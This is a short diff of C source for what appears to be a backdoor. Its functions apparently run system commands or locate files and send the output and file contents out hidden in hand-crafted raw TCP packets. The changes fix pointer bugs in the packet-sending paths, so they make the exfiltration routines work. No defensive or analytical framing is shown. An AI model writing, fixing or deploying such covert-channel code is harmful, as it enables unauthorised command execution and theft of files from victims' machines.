@@ -14,7 +14,7 @@ void executeSystemCall(char *command)
     char *buffer = NULL;
     char *encryptedField = NULL;
     struct tm *timeStruct = NULL;
-    struct sockaddr_in *sin = NULL;
+    struct sockaddr_in sin;
     time_t t;
     unsigned short sum = 0;
     FILE *results = NULL;
@@ -43,7 +43,7 @@ void executeSystemCall(char *command)
     strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
     
     // Create the packet structure
-    buffer = createRawTcpPacket(sin);
+    buffer = createRawTcpPacket(&sin);
     
     // Read from the stream
     while ((bytesRead = fread(line, sizeof(char), 4, results)) > 0)
@@ -72,7 +72,7 @@ void retrieveFile(char *fileName)
     int socket = 0;
     char line[PATH_MAX];
     char *buffer = NULL;
-    struct sockaddr_in *sin = NULL;
+    struct sockaddr_in sin;
     
     FILE *results = NULL;
     
@@ -101,13 +101,13 @@ void retrieveFile(char *fileName)
     shutdown(socket, SHUT_RD);
     
     // Create the packet structure
-    buffer = createRawTcpPacket(sin);
+    buffer = createRawTcpPacket(&sin);
     
     // This will handle multiple results from locate, client may break depending
     // on the type of file requested.
     while (fgets(line, PATH_MAX, results) != NULL)
     {
-        processFile(line, socket, buffer, sin);
+        processFile(line, socket, buffer, &sin);
     }
     
     // Send a FIN packet to signal end of transfer
@@ -167,7 +167,7 @@ static void processFile(char *filePath, int socket, char *buffer, struct sockadd
         memcpy(buffer + sizeof(struct ip) + 16, &sum, sizeof(unsigned short));
         
         sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
-               (struct sockaddr *)&sin, sizeof(sin));
+               sin, sizeof(struct sockaddr_in));
     }
 }
 
